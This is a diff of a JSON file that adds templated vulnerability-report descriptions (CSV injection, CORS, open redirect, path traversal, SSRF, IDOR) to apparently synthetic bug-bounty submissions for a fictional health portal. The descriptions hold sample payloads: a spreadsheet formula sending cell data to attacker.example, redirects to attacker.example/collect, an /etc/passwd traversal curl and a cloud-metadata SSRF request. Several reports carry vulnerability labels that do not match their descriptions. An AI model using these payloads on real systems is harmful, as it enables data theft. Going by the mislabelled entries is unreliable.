+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.seefjord-health.foo/export`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15745,7 +15863,8 @@
           "offset": "4d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.seefjord-health.foo/export`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15877,7 +15996,8 @@
           "offset": "4d 23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.seefjord-health.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16032,7 +16152,8 @@
           "offset": "4d 22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.seefjord-health.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16168,7 +16289,8 @@
           "offset": "8d 17h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.seefjord-health.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16292,7 +16414,8 @@
           "offset": "1d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.seefjord-health.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16456,7 +16579,8 @@
           "offset": "8d 15h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.seefjord-health.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16616,7 +16740,8 @@
           "offset": "5d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.seefjord-health.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16751,7 +16876,8 @@
           "offset": "3d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.seefjord-health.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16892,7 +17018,8 @@
           "offset": "7d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17007,7 +17134,8 @@
           "offset": "2d",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.seefjord-health.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -17154,7 +17282,8 @@
           "offset": "3d 13h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.seefjord-health.foo/import`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17290,7 +17419,8 @@
           "offset": "9d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.seefjord-health.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17437,7 +17567,8 @@
           "offset": "6d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.seefjord-health.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17553,7 +17684,8 @@
           "offset": "3d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.seefjord-health.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17717,7 +17849,8 @@
           "offset": "8d 10h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.seefjord-health.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17807,7 +17940,8 @@
           "offset": "2d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.seefjord-health.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17940,7 +18074,8 @@
           "offset": "4d 22h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18084,7 +18219,8 @@
           "offset": "5d 7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.seefjord-health.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -18236,7 +18372,8 @@
           "offset": "3d 9h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.seefjord-health.foo/import`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18366,7 +18503,8 @@
           "offset": "3d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18510,7 +18648,8 @@
           "offset": "6d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.seefjord-health.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18662,7 +18801,8 @@
           "offset": "7d 22h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.seefjord-health.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18798,7 +18938,8 @@
           "offset": "2d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.seefjord-health.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18953,7 +19094,8 @@
           "offset": "7d",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.seefjord-health.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19100,7 +19242,8 @@
           "offset": "6d 7h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.seefjord-health.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19230,7 +19373,8 @@
           "offset": "1d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19385,7 +19529,8 @@
           "offset": "5d 9h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.seefjord-health.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19520,7 +19665,8 @@
           "offset": "2d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.seefjord-health.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19628,7 +19774,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.seefjord-health.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19756,7 +19903,8 @@
           "offset": "6d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.seefjord-health.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19895,7 +20043,8 @@
           "offset": "8d 20h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
